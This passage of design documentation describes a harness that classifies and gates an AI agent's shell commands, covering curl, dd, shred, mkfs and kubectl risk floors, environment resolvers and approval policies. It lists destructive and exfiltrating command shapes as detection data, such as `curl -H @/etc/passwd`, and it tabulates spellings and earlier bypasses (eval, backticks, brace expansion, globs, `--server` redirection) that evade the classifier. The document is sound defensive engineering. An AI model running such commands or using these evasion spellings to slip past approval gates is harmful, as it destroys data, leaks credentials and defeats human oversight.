| `low` (a SEPARATE floor, `isReadOnlyCurlCommand`, not part of this destructive scan -- see "curl read-only SHAPE floor" above) | `curl`, mandatory `-q`/`--disable` as the very next word, a single single-quoted `https://` URL, and only flags from the closed read-only set: `-s`/`-S`/`-f`/`-I` (any combination), `--silent`/`--show-error`/`--fail`/`--head`, and `-H`/`--header` or `-m`/`--max-time`/`--connect-timeout` each in separate-token form only, never repeated (round 2, task `fdaad781`: `-L`/`--location` and `-k`/`--insecure` dropped from this set, and `-q`/`--disable` became mandatory) |

`shred` and `mkfs` are matched on their HEAD TOKEN alone, since every real
invocation of them destroys something. The one exception is an invocation
whose ONLY argument is `--help`, `--version`, `-h`, `-V` or `-v`, which
cannot destroy anything; `shred -v secret.txt` keeps its `critical`.

**What the DESTRUCTIVE floor recognizes for `curl`** -- this is the
write-CAPABLE side, distinct from the SHAPE floor's `low` row above.
Named here are the specific flags and value shapes this scan knows about
(`-o`/`-O`/`-D`/`-c`/`-K`/`-w`/`-d`/`-F`/`-T`/`-X`/`-H`/`-b` and their long
spellings) — not a claim that this is curl's entire write-capable
surface; a shape the scan does not name (like `-w`'s format string
itself coming from a FILE) stays unclassified, see the gap below:

- **Writes a local file** (`high`, `destructive`+`data_loss`): `-o`,
  `-O`, `-D`, `-c`, `-K` (also inside a short cluster), `--output`,
  `--remote-name`, `--remote-header-name`, `--dump-header`,
  `--cookie-jar`, `--config`, `--create-dirs`, `--output-dir`,
  `--etag-save`, `--trace`, `--trace-ascii`, `--stderr`; and
  `-w`/`--write-out` whose format string carries curl 8.3.0's
  `%output{FILE}` directive. The `%output` text is looked for in every
  token once a write-out flag is present, because a format string with a
  space in it reaches this scan as several tokens; that over-matches an
  argument that merely contains the literal `%output`, which is the safe
  direction for a floor that only raises.
- **Sends a request body or a mutating method** (`high`,
  `production_mutation`+`network_exfiltration`): `-d`, `-F`, `-T` (also
  inside a cluster), `--data*`, `--json`, `--form`, `--form-string`,
  `--form-escape`, `--upload-file`; and `-X`/`--request` naming anything
  but GET/HEAD.
- **Reads a local file into the outgoing request** (`high`,
  `network_exfiltration` alone): `-H`/`--header` whose value starts with
  `@` (`-H @/etc/passwd`), and `-b`/`--cookie` whose value contains no
  `=` (`-b jar.txt`; `-b @jar.txt` also matches, but not because of the
  `@` — curl opens whatever filename follows it, `@` included, since
  the `@` file-marker rule is `-H`'s, not `-b`'s), in every spelling of
  the value (next token, glued, `=`-joined). `-b 'name=value'` (a `=`
  present) sends inline cookie data and stays inert. Not the
  request-body category pair: shipping a file out is exfiltration, but
  it does not by itself mutate the remote resource, and without an
  irreversible category the profile stays `reversible: true`.
  `network_exfiltration` alone is the pair that holds for a separated or
  `=`-joined spelling; a FULLY GLUED short-flag cluster
  (`-H@/etc/passwd`) may additionally trip the short-cluster character
  scan on its own value text and pick up further categories beyond
  `network_exfiltration` alone — an accepted over-block, in the same
  raise-severity direction as every other floor over-block.

**A gap this scan does not close.** `-w`/`--write-out`'s format string
can itself be supplied FROM A FILE (`-w @fmt.txt`), and that file can
carry the same `%output{FILE}` directive as an inline format string
(confirmed to write on curl 8.7.1). This scan only inspects argv text; it
never opens a file to look inside it, so `curl -w @fmt.txt URL` is not
recognized here and stays unclassified — approval-gated at the "high"
rung by the fail-close rule, not silently allowed. See the "Not
recognized, by design" table below.

Categories follow the shipped patterns: `destructive`+`data_loss` for the
filesystem and git shapes (`irreversible_action` for `shred`,
`infrastructure_change` for `mkfs`, `production_mutation`+
`deployment_change` for `git push --force`),
`production_mutation`+`network_exfiltration` for a curl request body,
`network_exfiltration` alone for a curl `@FILE` header or cookie, and
`mass_update` alone for `chmod`/`chown -R`, which keeps that profile
`reversible: true`: a recursive mode or owner change rewrites metadata
across a tree, which is worth a `high` gate, but the inverse command
undoes it.

The floor is argv-aware where a regex pattern cannot be. It resolves the
real head through a path prefix (`/bin/dd`), the shared wrapper vocabulary
(`VAR=x`, `env`, `command`, `sudo`, `doas`, `nice`, `time`, `timeout`,
`stdbuf`, `setsid`, `exec`, `nohup`, via `peelWrapperPrefixes` in
`command-normalize.ts`), a `busybox`/`toybox` multi-call prefix, and a
nested `sh -c "..."` / `bash -lc '...'` command string, and it examines
every boundary-delimited segment of a chained command. `dd` reading into a
pipe (`dd if=/dev/sda | gzip`) is deliberately NOT floored: it mutates
nothing, and flooring it would hard-block a backup on a
production-resolved session, which is the false positive this task exists
to remove.

**Template alignment.** The `dangerous-shell` patterns in `FULL_TEMPLATE`
and `docs/examples/full-manifest.yaml` were tightened to match this floor
where a regex can: `truncate` now matches the glued `-s0` form,
`chmod`/`chown` is short-cluster-aware like `git clean`'s pattern, the
`curl` body pattern covers `--json`/`-F`/`--form`/`--form-string` and any
`-X`/`--request` method other than GET/HEAD in any letter case, and a
third `curl` pattern covers the local-write flags
(`-o`/`-O`/`-D`/`-c`/`-K` in a cluster, the long spellings, and
`-w`/`--write-out` with `%output`). They stay
narrower than the floor for the spellings a raw-string regex cannot follow
(path-qualified, wrapper-wrapped, and `sh -c`-nested invocations, the
`git checkout .` form without `--`, the `@FILE` value on `-H`, whose `@`
a raw-string pattern cannot tell from an `@` anywhere else in the line,
and the no-`=` filename value on `-b`, which a raw-string pattern has no
reliable way to tell from inline cookie data), which is acceptable
BECAUSE the floor covers them. `tests/runtime/destructive-shell-floor.test.ts` pins that
every template pattern's canonical spelling is also caught by the floor at
the same severity or higher, so the mirror can only be narrower, never
divergent.

**Not recognized, by design.** A truncating redirection (`cmd > file`):
this module has no redirection model, and a text heuristic for a bare `>`
over-matches `2>&1`, heredocs, and comparison operators. See the same
disclosure under "Unclassified actions and the fail-close rule" below.

The floor's head resolution follows a path prefix, the wrapper vocabulary,
`busybox`, and `sh -c`, but it is not a shell parser, so these spellings
reach a destructive command without being recognized (each measured, and
pinned as uncovered in `tests/runtime/destructive-shell-floor.test.ts` so
a future change cannot move one silently):

| Spelling | Why it is missed |
| --- | --- |
| `{ dd of=y; }` | `{` and `}` are not boundary-split characters, so `{` resolves as the head |
| `` `dd of=y` `` | a backtick is not a boundary-split character either, so the head token is `` `dd `` |
| `eval "dd of=y"` | `eval` is not in the wrapper vocabulary, and its argument is an unexamined command string |
| `find . -exec sh -c '<cmd>' {} +` | only a DIRECT `-exec rm` payload is recognized, not a nested shell whose command string is one quoted argument |
| `git -c k=v push --force` | `-c` is deliberately absent from the git global-flag skip list (config injection can execute code), so the subcommand walk stops before `push` |

One row below is a different KIND of gap: not a missed head, but a value
this scan cannot see into, because the value lives in a file rather than
in the command text itself:

| Spelling | Why it is missed |
| --- | --- |
| `curl -w @fmt.txt URL` | `-w`/`--write-out`'s format string can be read from a FILE (`@fmt.txt`); this scan inspects only argv text, so a `%output{FILE}` directive hidden inside that file is invisible to it. Stays unclassified and approval-gated. |

None of these is silently allowed: each stays UNCLASSIFIED, which the
`when:` evaluator treats as risk-bearing at the "high" rung, so a
production-scoped approval gate still fires on them. What they lose is the
`critical` hard block. Closing them would mean shipping a real shell
parser in the classifier, which is out of scope for a floor whose whole
contract is "decidable from argv tokens alone".

**A built-in floor classifies — which retires the "unknown is not safe"
fallback for `risk.category_in` and `action.reversible`, not just
severity.** This matters for one specific policy shape. While an action
is unclassified, "unknown is not safe" makes it satisfy every
`risk.category_in` clause AND every `action.reversible` clause
automatically. Once ANY floor classifies it, that fallback no longer
applies to either clause, and both become real tests against the floor's
actual values, not the blanket assumption. Two shapes lose coverage, for
different reasons:

- **The benign floors' EMPTY category list.** `sed -n '1,5p' f` no longer
  matches `risk.category_in: [network_exfiltration]` once it floors to
  `low`, though it did while unclassified: `sed`'s (and `cat`'s/`ls`'s)
  read-only floor sets severity only and leaves `categories: []`, so
  `category_in` becomes a set test against nothing.
- **The destructive floor's NON-EMPTY but NARROW category list.** A
  destructive-floor hit does carry categories, but only the ones that
  shape's own recognition names, which can be narrower than a policy
  assumes. `chmod -R 777 /srv` classifies `high` with
  `categories: [mass_update]` and `reversible: true`, so it does NOT
  match `risk.category_in: [destructive]` nor `action.reversible: false`,
  though both clauses passed while it was unclassified. `curl -X POST
  https://h/x` similarly classifies with `[production_mutation,
  network_exfiltration]`, never `destructive`; and the `-H @FILE` /
  no-`=` `-b` cookie-file shape classifies with `[network_exfiltration]`
  alone and stays `reversible: true`.

This is the correct reading of a proven-narrower action, not a bug: a
floor that classifies is making a real, bounded claim, and a
`risk.category_in`/`action.reversible` policy that assumed the blanket
"unknown is not safe" coverage was relying on the fallback rather than on
what the floor actually recognizes. If you need such a policy to keep
firing regardless, scope it by `risk.severity_at_least` as the shipped
`gate-prod-destructive` policies do, or classify the shape explicitly
with your own pattern that names the category you need. Pinned in
`tests/runtime/when-eval.test.ts`.

#### Kubectl read-only verb floor (decision record, task `da823721`)

**Status: GO, shipped.** Superseded, prior status: a Risk Gate false
positive, waived at task `a7eb1a71` (see below).

**Context.** Task `a7eb1a71` made an explicit `kubectl --context` /
`--namespace` / `-n` flag a resolver signal (see below). That surfaced a
measured interaction: once a command like `kubectl get pods --context
prod-eu-1` resolves `environment: production`, the pre-existing "unknown
is not safe" rule (`risk.severity_at_least` matches ANY threshold on an
unclassified action, see `evaluateWhen` in `src/runtime/when-eval.ts`)
makes that read require approval too — exactly like `kubectl delete
namespace payments --context prod-eu-1` does, even though `get` cannot
mutate anything. `a7eb1a71`'s AC5 measured and waived this rather than
fixing it; this task makes the fix decision.

**Decision: GO**, with a floor narrower than the general read-only floor
above, built from two ALLOWLISTS rather than a metacharacter denylist
(round 3 redesign — see "Round 3: from metacharacter exclusions to
allowlists" below for why). A curated set of kubectl read verbs — `get`,
`describe`, `logs`, `top`, `api-resources`, `api-versions`, `version`,
`cluster-info`, `explain`, and `auth can-i` (a permission CHECK, never
the resource's own data) — floors to `low` only when BOTH allowlists
hold: (1) every token after `kubectl` matches a plain-word shape
(letters, digits, and `` _ . : / = , @ % + - ``; no quotes, backslashes,
`$`, backticks, braces, globs, or any other shell-special character),
and (2) every flag token is drawn from that verb's explicit read-flag
allowlist (or the global-flag allowlist, legal before or after the
verb: `--context`, `--namespace`/`-n`, `--request-timeout`, `-v`/`--v`,
and `--all-namespaces`/`-A`; the first five consume a value. Accepting
`-A` globally is a deliberate simplification: kubectl rejects it on
`logs`/`top`, so those commands merely error at `low`). `cluster-info`
accepts no positional: `cluster-info dump` prints cluster-wide pod logs
and is refused, together with any future sub-subcommand. Each `*_VALUE`
flag is assumed to be a pflag flag with an empty NoOptDefVal, i.e. it
always consumes the next argv element; a future flag-list edit must
check that property, otherwise the consumed token becomes a live flag
kubectl would honour) — UNLESS, additionally, the resource argument mentions "secret" or
"configmap" in any form (`get secret`, `get secrets`, `get
secret/<name>`, `describe secret`, `-o yaml`/`-o json` on a secret, a
comma-list like `get pods,secrets`; the same shapes for
`configmap`/`configmaps`/the bare `cm` abbreviation), for `get`/
`describe` only. `--raw` (an arbitrary, unclassifiable API path),
`--filename`/`-k`/`--kustomize` (FILE- or kustomization-DIRECTORY-
driven resource selection this module cannot read into; `-f` is
allowlisted for `logs` only, where it means --follow, and is absent from
`get`/`describe`, where it is the file selector), and
`--server`/`-s`/`--kubeconfig`/`--token`/`--as`/`--as-group`/`--user`/
`--cluster`/`--tls-server-name`/`--insecure-skip-tls-verify` (endpoint or
identity redirection) are never members of any verb's flag allowlist, so
each is refused by the SAME mechanism — an absent allowlist entry — not
by a dedicated check per flag. An unresolved `$`-expansion (`$VAR`,
`${VAR}`, `"$VAR"`) fails the token-shape allowlist directly, for the
same reason: the resource-type argument is then not literally readable,
so it cannot be proven safe. Any other kubectl subcommand — `apply`,
`delete`, `patch`, `create`, `replace`, `scale`, `rollout`, `drain`,
`cordon`, `taint`, `label`, `annotate`, `set`, `exec`, `cp`,
`port-forward`, `proxy`, `edit`, `attach`, `debug`, `auth reconcile`,
`config`, or anything this floor has not enumerated — is NOT on the verb
allowlist and stays fail-closed (unknown is not safe), unchanged.
Implementation: `isReadOnlyKubectlCommand` in
`src/runtime/read-only-bash.ts`, wired into `classifyRisk`'s built-in
floor block in `src/runtime/risk-classifier.ts` alongside (not merged
with) the general read-only floor.

**Round 3: from metacharacter exclusions to allowlists.** Round 1 shipped
a narrow verb floor with a secrets/configmap substring exclusion; round 2
added `--raw`, file/kustomize selection, and `$`-expansion exclusions on
top of it. Round-2 review then found the same class of bug a third time —
brace expansion (`kubectl get s{e..e}cret ... ` expands to `secret`
before kubectl ever sees the argv), glob patterns (`get s*`, `get
sec[r]et`), and endpoint redirection (`--server`/`-s`/`--kubeconfig`, pre-
or post-verb) all floored end-to-end — because each round had patched one
more shell-metacharacter bypass onto the same substring/decode-based
exclusion instead of closing the class. The halt decision was to stop
enumerating metacharacters and redesign to the two allowlists described
above: a token-shape allowlist closes brace expansion, globs, quoting,
and escaping in a single check (a quoted or escaped token simply never
matches the plain-word pattern, which is also why the per-token
`decodeShellWord` decoding round 1 added to the secret/configmap checks
is no longer needed — those checks now only ever see raw tokens that
already passed the shape check), and a flag allowlist closes endpoint
redirection, `--raw`, and file/kustomize selection in one mechanism
(omission from the allowlist) instead of three separate checks.

**ConfigMap sub-decision.** ConfigMap data is a common credential store
in practice (`.env`-shaped config, connection strings, and — while an
anti-pattern — plaintext secrets are all routinely stored there instead
of in a `Secret` object), so `get`/`describe configmap` gets the same
fail-safe exclusion as `secret`, not just the built-in Kubernetes
Secret kind.

**File-driven selection and `$`-expansion, round 2 (review HIGH findings
1 and 2).** Both were measured, end-to-end, to resolve ALLOW before this
fix: `kubectl get -f manifest.yaml -o yaml --context prod-eu-1` and
`kubectl get -k overlays/prod -o yaml --context prod-eu-1` bypassed the
secrets/configmap exclusion because the manifest file or kustomization
directory's contents are invisible to a string classifier; `kubectl get
$KIND -o yaml --context prod-eu-1` bypassed it because the raw command
text never contains the literal resource name the shell would substitute
at execution time. Both close the same way as the rest of this module:
fail closed rather than attempt to resolve the file or the variable.

Two sub-decisions, made explicit because they were judgment calls, not
mechanical:

- **`kubectl get all` is NOT excluded, for kubectl's BUILT-IN resources.**
  kubectl's built-in `all` resource-category alias covers only the
  common workload/networking kinds (pods, services, deployments,
  replicasets, statefulsets, jobs, cronjobs, and a handful of others) and
  never `Secret` or `ConfigMap` — runnable check: `kubectl
  api-resources --categories=all` lists every resource type kubectl
  currently considers part of `all` on a given cluster (this repo has no
  `kubectl` installed and no live cluster to run it against; this is the
  command an operator can run to confirm the claim on their own
  cluster, not a claim this task ran it). The caveat is CRDs: a Custom
  Resource Definition can opt itself into the `all` category via its own
  `spec.names.categories: [all]`, and nothing stops a CRD author from
  naming a Secret-shaped custom resource that way — `get all` on a
  cluster with such a CRD installed could return that CRD's data without
  the "secret"/"configmap" substring ever appearing in the command text.
  This floor accepts that as a known, unmitigated gap specific to
  cluster-defined CRDs, not a Secret/ConfigMap exposure through
  kubectl's own built-in resource set.
- **`kubectl explain secret` IS floored**, even though the resource word
  "secret" appears. `explain` prints the API SCHEMA for a kind (field
  names and types), never a live object's data — there is no Secret to
  read. The secrets exclusion is scoped to `get`/`describe` only (the two
  verbs that can return an actual object), not to every verb that merely
  names a resource kind.

The secrets check itself is deliberately over-broad in the fail-safe
direction: it matches "secret" as a case-insensitive substring anywhere
in the command's (already token-shape-validated, so always raw and never
quoted or escaped) tokens, so `kubectl get secretstores --context prod`
(an unrelated CRD whose name happens to contain "secret") is also
excluded from the floor and falls back to requiring approval; likewise
any `!` in a value, so the common `--field-selector=status.phase!=Running`
is not floored either (the token-shape allowlist refuses `!`). This is an
accepted false positive — the detector over-matches "secret-shaped"
resource names, in the safe direction: the constraint this decision must
not violate is "a prod Secret read stays approval-gated," and the
substring match can only ever REQUIRE more approval than a precise
resource-type parse would (a convenience cost, occasionally requiring
approval for a genuinely safe read), never less.

**Blast radius, and why the floor is NOT in `isReadOnlyBashCommand` /
`isReadOnlyBashPipeline`.** Those two functions are shared by three
consumers, only one of which this task's floor is meant to change:

1. The Risk Classifier's built-in floor (`risk-classifier.ts`) — the
   consumer this decision targets. `kubectl` was never in
   `isReadOnlyBashCommand`'s `classifyTokens` dispatch, so before this
   task every kubectl invocation was simply unclassified there; nothing
   downstream of that function changes for kubectl. The new floor is a
   SEPARATE check (`isReadOnlyKubectlCommand`), consulted only from
   `classifyRisk`'s own built-in-floor block.
2. The understanding-gate PreToolUse blocker (`hook-pre-tool-use.ts` /
   `hook-codex-pre-tool-use.ts`), via `isReadOnlyBashPipeline` — must
   keep requiring an approved Understanding Report for EVERY kubectl
   command, including a plain `kubectl get pods`, unchanged by this
   task. Proven by a real end-to-end test (not just the classifier unit):
   `tests/cli/pack-hook-pre-tool-use.test.ts`'s "kubectl unaffected by
   the Risk Classifier's kubectl read-only floor" describe block asserts
   `result.blocked === true` for `kubectl get pods --context prod-eu-1`,
   bare `kubectl get pods`, `kubectl auth can-i get pods`, and `kubectl
   describe namespace payments --context prod-eu-1`, with no report and
   no approval on the ledger.
3. The solution-acceptance write-guard
   (`hook-solution-acceptance-writeguard.ts`), via `isReadOnlyBashCommand`
   directly — its read-only fast path exists to recognize commands that
   cannot write to the local filesystem (specifically: cannot write into
   the harness-protected solution-verdict directory). A kubectl
   invocation writes nothing to the local filesystem regardless of
   whether it reads a Secret from the API server, so this consumer's own
   semantics are orthogonal to the secrets question the Risk Classifier
   floor exists to answer; wiring the kubectl floor there was considered
   and rejected as the wrong question for that gate, not merely
   redundant. Leaving `isReadOnlyBashCommand` untouched for kubectl means
   this consumer is provably unaffected by construction (no new code
   path reaches it) rather than by a behavioral proof, which is the
   simpler and stronger guarantee.

Given (2) and (3), folding the new floor into the shared
`isReadOnlyBashCommand` would have widened the understanding-gate
PreToolUse blocker (letting an unreported `kubectl get` through without
an approval) as a side effect of a Risk Classifier decision — an
unrequested, untested change to a different gate's fail-closed posture.
Keeping the floor as its own function, consulted only from
`risk-classifier.ts`, scopes the blast radius to exactly the gate this
decision is about.

**Fail-safe posture, restated:** every ambiguous shape (an unrecognized
subcommand, an unrecognized flag anywhere — before or after the verb,
including `--raw`, file/kustomize-driven resource selection, and
endpoint/identity redirection, all of which are simply absent from the
flag allowlists — any non-plain-word token, including an unresolved
`$`-expansion, and mention of "secret" or "configmap") falls through to
`false` — not floored, so "unknown is not safe" still applies and the
action requires approval on a production-resolved session. The floor can
only ever ALLOW something the "unknown is not safe" rule would otherwise
have blocked; it cannot itself cause a block.

**Residual risks, accepted:**

- **`--as`/`--as-group` impersonation is refused, not floored, as of
  round 3** — a behavior CHANGE from rounds 1-2, where a floored
  `kubectl get pods --as some-other-user --context prod-eu-1` was still
  a READ (it cannot mutate cluster state) but through a DIFFERENT RBAC
  identity than the caller's own. Round 3 folded `--as`/`--as-group`
  into the same never-allowlisted set as `--server`/`--kubeconfig` (see
  "Round 3" above) because it is, structurally, the same identity-
  redirection shape; the earlier rounds' acceptance of it as read-only
  regardless of which RBAC identity performs the read is superseded, not
  reaffirmed.
- **`logs`/`describe` output may itself carry credentials** — a
  container's stdout/stderr can log a token or connection string, and a
  `describe`d object's annotations or event history can echo one back.
  This is a consciously accepted, non-mutating exposure: the floor's
  secret/configmap exclusion targets the RESOURCE TYPE being read (can
  this verb return an object whose entire purpose is to hold
  credentials), not every possible credential that could appear inside
  the free-text output of an otherwise-ordinary resource read, which no
  string classifier can enumerate.
- **The secret/configmap exclusion is a two-KIND resource-TYPE denylist,
  not a credential-content scan.** It excludes `Secret` and `ConfigMap`
  objects by name; it says nothing about credentials that live inside a
  DIFFERENT resource type's ordinary fields. A floored `kubectl get pods
  -o yaml --context prod-eu-1` can return a Pod spec's plaintext `env:`
  literals (as opposed to a `secretKeyRef`, which names a Secret but not
  its value), and a floored `kubectl get application my-app -o yaml
  --context prod-eu-1` (or `helmrelease`) can return a Flux
  `HelmRelease`/Argo CD `Application` object whose `values:`/`spec:`
  block embeds plaintext credentials by convention in some clusters, in
  full. Both are accepted, for the same reason the two-KIND scope was
  chosen over a full credential-content scan in round 1: a resource-TYPE
  check is mechanical and provably complete over the two kinds it
  targets, where a content scan over arbitrary YAML would be a
  best-effort heuristic with its own false-negative surface. Mitigation
  is out of this floor's scope: an operator who runs clusters with
  credential-bearing CRDs (HelmRelease, Application, or a custom
  resource with the same shape) should add an operator-defined
  classifier pattern (`policy.when` / a custom risk rule, see the
  Classifier reference above) naming those resource types explicitly,
  the same way this decision's own two-KIND denylist was chosen instead
  of trying to close every credential-bearing shape at once.

**Verification.** `tests/runtime/read-only-bash.test.ts`'s "kubectl
read-only floor" describe block unit-tests `isReadOnlyKubectlCommand`
directly (floored / not-floored / edge cases / chaining / a 30-flag
timing check; round 3 added dedicated blocks for brace expansion, glob
patterns, endpoint/identity redirection, and unknown/unlisted flags, plus
a per-verb flag-allowlist positive block), and separately pins that
`isReadOnlyBashCommand` / `isReadOnlyBashPipeline` still classify every
kubectl form `false`. `tests/runtime/risk-classifier.test.ts`'s
"built-in kubectl read-only floor" describe block covers `classifyRisk`
directly, including the secrets exclusion and the
operator-classifier-still-wins case.
`tests/runtime/intercept-cli-kube-context-flag.test.ts`'s "kubectl
read-only floor end-to-end" describe block runs the real
`runInterceptCli` policy-intercept path (not just the classifier) for
both the allow case (`kubectl get pods --context prod-eu-1`) and the
still-approval-gated cases (`kubectl get secret -o yaml --context
prod-eu-1`; the file-driven-selection, `$`-expansion, and configmap
cases from round 2; and, added in round 3, the brace-expansion and
`--server` pre-/post-verb endpoint-redirection cases), and its earlier
AC2/AC5 classifier-half tests were updated from "unclassified" to
"floored to low" to match this decision.
Negative control: removing the kubectl floor (or, individually, the
secrets/configmap exclusion, the file-selection guard, the
`$`-expansion guard, the token-shape allowlist, an entry from the flag
allowlist, or the flag-allowlist enforcement itself) was applied and
observed to fail exactly the tests named above, then restored — see the
`[Unreleased]` CHANGELOG entry for task `da823721` and the named test
blocks above (this file's own record of what was measured, rather than
a pointer to a subagent report that does not live in this repository).

### Environment resolvers (`environments:`)

*Status: parsed and validated (Phase 7 #1). Consumed by the Context
Resolver as of Phase 7 #4, inspectable with `harness resolve-env`.
Wired into `harness policy intercept` as of Phase 7 #5.*

```yaml
environments:
  resolvers:
    - name: production-signals     # unique within environments.resolvers[]
      environment: production      # production | staging | dev | local
      signals:
        branch_patterns: [main, "release/*"]
        env_var_patterns:
          - var: DATABASE_URL
            patterns: [prod, production]
        kube_context_patterns: [".*prod.*"]
        kube_namespace_patterns: [prod, production]
```

A resolver asserts a single `environment` when any of its `signals`
match. At least one of the four signal kinds must be present, a
resolver with no signals can never fire and is a validate error.

The `environment` a resolver asserts is one of `production`, `staging`,
`dev`, `local`. The fifth name, `unknown`, is the implicit fallback
when no resolver matches, so a resolver cannot assert it: "unknown is
not safe" means policy treats the no-match case as risk-bearing, it
does not mean a resolver hand-labels something unknown.

Pattern match semantics per signal kind, as implemented by the Phase 7
#4 resolver:

- `branch_patterns` and `kube_namespace_patterns`: `*`-globs (only `*`
  is special, e.g. `release/*`). Matched against the envelope's git
  branch and the current kube namespace.
- `kube_context_patterns`: regexes (e.g. `.*prod.*`). Matched against
  the current kube context name.
- `env_var_patterns`: substrings of the named variable's value (e.g.
  `DATABASE_URL` containing `prod`).

Signals within a resolver are OR-ed: a resolver fires when any one
signal matches. When several resolvers fire and disagree, the
most-dangerous environment wins (`production > staging > dev > local`).
Branch comes from the Action Envelope; env vars and the kube
context/namespace are ambient inputs the `resolve-env` wrapper resolves
(`~/.kube/config` is read best-effort).

**The branch signal is not only the hook's starting cwd.** Inside
`harness policy intercept`, a leading `cd <path> && ...` in the SAME
Bash command redirects `branch_patterns` matching to the `cd` target's
own `.git/HEAD` instead of the hook cwd's. That redirection is
bidirectional and PRE-EXISTING (not fixed by task 341e024b below): a
`cd` into a checkout on a production branch can reveal a signal cwd
alone would have missed, and a `cd` into a checkout on a feature branch
can just as easily hide one cwd alone would have caught (see the
`resolverGit` comment in `src/cli/policy/intercept.ts` for the full
asymmetry). A leading `git switch <branch>` / `git checkout <branch>`
(also honoring a `-C <path>` in front, task 341e024b) is layered on top
of that `cd`/cwd-based result and is deliberately NOT bidirectional: it
is upgrade-only, so it can only push the resolved environment to
something MORE dangerous than the `cd`/cwd-based result already gave,
never less — switching away from a production branch never downgrades
an already-production classification. `git checkout -- <path>` (a file
restore, not a branch change) and an unresolvable `$VAR`/`${VAR}`
branch argument set no branch signal at all, rather than being guessed.
The branch argument may be unquoted or quoted (`git switch "main"` /
`git switch 'main'`, task 341e024b fix round 1) — surrounding quotes are
stripped before matching, since an operator can quote a whitespace-free
branch name and an unstripped quote character would never match a plain
`branch_patterns` entry like `main`. A `$`-containing DOUBLE-quoted
branch argument is still left unresolved (real bash interpolates inside
double quotes; a SINGLE-quoted one is always taken literally, since
single quotes never interpolate). Only the FIRST leading branch switch
in a command is captured — a chained `git switch dev && git switch main
&& ...` resolves the candidate as `dev`, never `main`; multi-switch
parsing is deliberately not built (see the parser's own module doc for
the false-positive-class rationale).

**The kube signal is not only the ambient `~/.kube/config` either**
(task `a7eb1a71`). An explicit `--context`, `--namespace`, or `-n` flag
named directly in a `kubectl ...` Bash command is parsed out of the
command (`--flag value`, `--flag=value`, and, for `-n` only, the
concatenated `-nVALUE` pflag short-flag form too) and merged into the
resolver's kube inputs. **CONFLICT PRIORITY: the merge is UPGRADE-ONLY,
per field, mirroring the existing branch-switch merge above** (command
text can raise the resolved environment toward production, never lower
an already-resolved ambient production). The head test recognizes only
a `kubectl` invocation, its own first token or the first token of the
remainder after `src/runtime/bash-prefix-parse.ts` strips a leading
`cd`/`VAR=value`/`git switch` prefix, and reads flags only from that
invocation's own first shell segment, stopping at a bare `--`. See
`src/runtime/kubectl-target-parse.ts`'s own module doc for the full
scope and known-unhandled-shapes list, and CHANGELOG.md's
`[Unreleased]` entry for the measured downgrade this fixes.

One measured, out-of-scope interaction this surfaced: once this merge
correctly resolves `environment: production` from an explicit
`--context`, the PRE-EXISTING "unknown is not safe" rule (see
`policy.when:` below) makes an unclassified `kubectl get` against that
context require approval too, not only a classified-destructive action.
Giving read-only kubectl verbs a classified floor was waived as a
separate follow-up decision at this task; task `da823721` made that
decision (GO, a narrow secrets-excluding floor) — see "Kubectl read-only
verb floor (decision record, task `da823721`)" above.

The kubectl classifier pattern itself is also token-based and
flag-tolerant between the two verbs (same task), consuming zero or more
`-`/`--`-prefixed flag tokens with at most one, unambiguous, non-flag
value token each, linear in command length, while still requiring the
literal `delete` verb so `kubectl get`/`describe` never match, flagged
or not. `terraform destroy` got the identical treatment for terraform's
own `-chdir=DIR` global flag, which occupies the same position between
the tool name and its subcommand. See CHANGELOG.md's `[Unreleased]`
entry for the exponential-backtracking defect this replaced and its
measured timings.

`kube_context_patterns` are operator-authored regexes compiled at
resolution time. As with `risk.classifiers[].patterns`, harness does
not screen them for catastrophic backtracking: a manifest is operator-
trusted config, so a pathological pattern is a self-inflicted hazard.

### Risk-aware match clauses (`policy.when:`)

*Status: parsed and validated (Phase 7 #1). Evaluated by `harness
policy intercept` as of Phase 7 #5, inspectable with `harness
explain-policy <policy> --event <event.json>` (the trigger match, risk
classification, resolved environment, and a per-clause `when:`
breakdown for a hypothetical event).*

A policy may carry an optional `when:` block. As of Phase 7 #5 a
declared `when:` is ANDed onto the policy's `trigger:` match and
evaluated against the enriched Action Envelope: the policy fires only
when `trigger:` AND every `when:` clause hold. A policy with no `when:`
matches on `trigger:` alone, exactly as in Phase 4.

```yaml
policies:
  - name: gate-prod-destructive
    description: Require approval for destructive production actions.
    trigger:
      event: PreToolUse
      match: "Bash"
    when:
      risk.severity_at_least: high          # high or critical
      risk.category_in: [destructive, data_loss]
      environment.name: production          # production|staging|dev|local|unknown
      action.reversible: false
    requires:
      ledger_tag: "risk-approved:${SESSION_ID}"
    hook: risk-gate
    enforcement: block
```

Every clause is optional; an empty `when: {}` is rejected as a silent
no-op. `when.environment.name` may test `unknown`, the only place the
unmatched-environment case is addressable.

A `when:`-bearing policy still carries the Phase 4 `requires:`,
`hook:`, and `enforcement:` fields, all of them required by the schema.
Phase 7 #5 kept them mandatory: a `require_approval` policy expresses
its approval gate through `requires:` (the `risk-approved:${SESSION_ID}`
ledger tag), so the Phase 4 requires-evaluator is reused unchanged. A
pure risk policy that decides from `when:` alone, without ledger
evidence, would be a structural change to the policy model and is not
Phase 7 scope; it remains a possible future relaxation.

### Unclassified actions and the fail-close rule

The "unknown is not safe" rule means that any action the Risk Classifier
does not recognise (no classifier pattern matched) satisfies every
`risk.category_in` and `action.reversible` clause automatically. The
`environment.name` clause is exempt: the Context Resolver always returns
a concrete environment (the no-match case resolves to the matchable
name `unknown`), so it is always a real equality test.

**`risk.severity_at_least` is narrower, since task `2929c5b7`.** An
unclassified action still satisfies `severity_at_least: low` / `medium` /
`high`: it is treated as sitting one rung below the top of the severity
scale, "high" on the shipped four-value scale. It no longer satisfies
`severity_at_least: critical` on its own. An unknown severity is
risk-bearing, so an approval-required gate on an unrecognized production
command still fires, but it is not itself proof of the WORST tier, and a
hard block the agent cannot override deserves a real classification.

The rule exists because the old blanket fallback let a run of
unrecognized READ commands trip the shipped `gate-prod-destructive`
policy's hard block on a production-resolved session, exactly as a
genuine `rm -rf /` would; the measured incident is recorded in the
CHANGELOG entry for task `2929c5b7`.

This is deliberately paired with two other changes, so the loosened
fallback does not silently reopen a bypass for a mutating head that
simply has no classifier pattern:

1. **The common read-only heads are now explicitly floored to `low`**
   (see "Built-in read-only commands", "`sed` read-only floor", and
   "curl read-only SHAPE floor" above): `cat`, `grep`/`rg`, `ls`, `head`,
   `tail`, `wc`, `stat`, `file`, `less`/`more`, `diff`, a read-only `sed`
   invocation, a read-only-SHAPE `curl` invocation (task `fdaad781`,
   decision D-026, round 2 hardened: a bare `curl`, mandatory `-q`/
   `--disable` as the next word, a single single-quoted `https://` URL,
